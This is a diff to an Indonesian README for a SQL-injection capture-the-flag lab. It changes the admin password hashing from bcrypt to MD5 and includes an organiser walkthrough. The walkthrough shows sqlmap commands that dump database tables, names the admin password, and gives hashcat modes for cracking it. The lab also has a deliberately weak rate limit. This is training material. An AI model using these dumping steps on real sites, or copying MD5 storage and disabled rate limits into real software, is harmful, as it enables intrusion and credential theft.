@@ -25,7 +25,7 @@ Akses: `http://<server-ip>:8001`
 | `db` | mysql:5.7 | Port TIDAK dipublish ke host (sqlmap harus lewat web) |
 
 Database:
-- `lain` → `episodes` (target query), `secrets` (**flag 1 & 2 di sini**), `admin_users` (**kredensial admin asli, bcrypt**), `knights_messages` (decoy)
+- `lain` → `episodes` (target query), `secrets` (**flag 1 di sini**; flag admin sengaja TIDAK disimpan di DB), `admin_users` (**kredensial admin asli, MD5**), `knights_messages` (decoy)
 - `admin` → `admins` (kredensial palsu/decoy)
 
 ## URL
@@ -45,14 +45,14 @@ Link admin sengaja tidak ada di halaman manapun — peserta harus menemukannya d
 3. **Rate limit nyaris hilang** — limit di-set sangat tinggi (100.000 req/menit untuk SQLi, 1.000 percobaan login), jadi praktis tidak terasa. sqlmap jalan full speed tanpa `--delay`.
 4. **Flag** — semua flag tetap di dalam database.
 5. **Decoy tetap ada** — database `admin` berisi tabel `admins` palsu; tabel `knights_messages` berisi pesan pengecoh (bonus edukasi, tidak menghalangi).
-6. **Password admin crackable** — hash bcrypt dibuat dari password wordlist-friendly (`cyberia2026`); peserta bisa hashcat -m 3200 / john, atau langsung dump dari `lain.admin_users`.
+6. **Password admin crackable** — hash MD5 dibuat dari password wordlist-friendly (`cyberia2026`); peserta bisa hashcat -m 0 / john, atau paste ke crackstation.net — laptop biasa sanggup.
 
 ## 2 Flag + 1 Decoy
 
 | # | Flag | Lokasi | Cara dapat |
 |---|---|---|---|
 | 1 | `FLAG_SQLI` | `lain.secrets` bucket `flag_sqli` | Error-based/UNION SQLi dump via sqlmap (tanpa tamper) |
-| 2 | `FLAG_ADMIN` | `lain.secrets` bucket `flag_admin`, ditampilkan di dashboard admin | Dump `lain.admin_users` → dapat `username:password` → login → flag di dashboard |
+| 2 | `FLAG_ADMIN` | **TIDAK di database** — hanya muncul di dashboard `/administrator/dashboard.php` setelah login | Dump `lain.admin_users` → dapat `username:password` → login → flag ditampilkan dari env |
 | - | `FLAG_DECOY` | `lain.secrets` bucket `decoy` | Jebakan — bukan flag yang benar untuk submit |
 
 ## Walkthrough (ORGANIZER ONLY — spoiler)
@@ -69,14 +69,14 @@ sqlmap -u "http://<server>:8001/detail.php?id=1" --batch --dbs
 sqlmap ... -D lain -T secrets --dump
 #    -> flag_sqli = FLAG 1
 #    -> decoy    = FLAG_DECOY (jebakan)
-#    -> flag_admin butuh langkah login dulu
+#    -> flag_admin TIDAK ADA di sini (tidak pernah disimpan di DB)
 
 # 3. Dump kredensial admin asli
 sqlmap ... -D lain -T admin_users --dump
-#    -> username: lain_chrono | password_hash: bcrypt(username:password)
-#    Easy: hash bcrypt ini crackable. Password dibuat wordlist-friendly
-#    ("cyberia2026"), jadi hashcat -m 3200 / john dengan wordlist standar
-#    akan menemukannya.
+#    -> username: lain_chrono | password_hash: MD5(password)
+#    Easy: hash MD5 crackable di laptop biasa. hashcat -m 0 / john,
+#    atau tempel ke crackstation.net — password dibuat wordlist-friendly
+#    ("cyberia2026").
 
 # 4. Login di /administrator/ dengan kredensial -> FLAG 2 di dashboard
 
